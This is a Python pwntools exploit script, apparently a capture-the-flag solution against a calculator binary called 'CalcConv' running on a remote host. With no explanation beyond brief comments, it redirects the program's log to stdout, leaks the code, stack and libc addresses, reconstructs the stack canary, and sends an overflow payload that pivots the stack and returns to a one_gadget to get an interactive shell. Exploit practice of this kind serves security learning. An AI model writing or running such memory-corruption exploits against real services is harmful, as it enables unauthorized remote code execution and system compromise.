from pwn import *
from time import sleep

#r = process("./CalcConv", env = {'LD_PRELOAD' : './libc.so.6'}, aslr = True)
r = remote("54.157.217.45", 49669)

libc = ELF("./libc.so.6")
system_off = libc.symbols["system"]
bin_sh_off = next(libc.search("/bin/sh"))
# Change the log file to /proc/self/fd/1 to display on stdout
r.recvuntil("start!\n")
r.sendline("(setting)")
r.sendafter("location:\n", "/proc/self/fd/1")
# Leak .text
r.sendlineafter("successfully!\n", "(calculator)")
r.recvuntil("[DBG] : ")
text = int(r.recv(14), 16) - 2105420
log.info('text = ' + hex(text))
command = text + 2105424 + 100
rdi = text + 0x1483
ret = text + 0x84e
# Leak stack
r.recvuntil("[DBG] : ")
stack = int(r.recv(14), 16)
log.info('stack = ' + hex(stack))
# Calculate canary
canary = 0
for i in range(8):
    canary = stack + 63 + canary*16
    canary = canary & 0xffffffffffffffff
log.info('canary = ' + hex(canary))
sleep(0.1)
# Use a long expression to leak libc
r.recvline()
r.send("0"*(0x47-16) + "+")
r.recvuntil("+")
libc_base = u64(r.recv(6) + '\0\0') + 3872
log.info('libc = ' + hex(libc_base))
system = libc_base + system_off
bin_sh = libc_base + bin_sh_off
one_gadget = libc_base + 0x10a38c  
sleep(0.1)
# Pass in a command that also set up valid stack to return to one_gadget
r.recvline()
payload = "(calculator)" + "A"*76
payload += p64(canary)
payload += "A"*16
payload += p64(one_gadget)
r.send(payload)
r.recvline()
r.recvline()
sleep(0.1)
# Pass in an expression to pivot the stack to bss, then return to one_gadget
op2 = str(canary)
op1 = str(canary + command)
op1 = "0" * (0x88 - len(op1) - len(op2) - 1) + op1
r.send(op1 + "/" + op2)

r.interactive()





